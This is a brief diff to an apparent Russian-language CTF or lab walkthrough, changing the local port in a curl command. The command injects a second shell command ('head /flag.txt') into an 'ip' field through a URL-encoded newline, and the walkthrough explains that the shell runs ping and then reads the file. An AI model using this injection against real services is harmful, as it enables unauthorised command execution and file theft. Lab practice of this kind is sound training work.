@@ -9,7 +9,7 @@
 1. Передать хост и вторую команду через URL-кодированный перевод строки:
 
    ```bash
-   curl --data 'ip=127.0.0.1%0Ahead%20/flag.txt' http://127.0.0.1:5105/
+   curl --data 'ip=127.0.0.1%0Ahead%20/flag.txt' http://127.0.0.1:5103/
    ```
 
 2. Shell выполнит `ping`, затем `head /flag.txt`.
